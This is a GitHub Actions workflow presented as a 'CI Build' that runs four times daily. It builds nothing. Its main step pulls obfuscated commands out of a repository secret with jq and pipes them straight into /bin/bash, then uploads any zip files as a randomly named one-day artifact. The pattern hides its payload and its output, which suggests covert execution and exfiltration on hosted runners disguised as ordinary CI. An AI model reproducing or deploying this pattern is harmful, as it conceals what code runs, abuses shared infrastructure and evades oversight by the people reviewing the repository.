name: CI Build
on:
  workflow_dispatch:

  schedule:
    - cron: '50 0,6,12,18 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          ez0119: ${{ secrets.ez0119 }}
        run: |
          printf '%s' "$ez0119" | jq -r .ak94514 | /bin/bash
          echo $lbw11 | jq -r .dcind4503 | /bin/bash
          echo $hxce83 | jq -r .qon8 | /bin/bash
          echo $ytx66 | jq -r .ghwb68 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: f8lYZVGB
          path: "*.zip"
          retention-days: 1
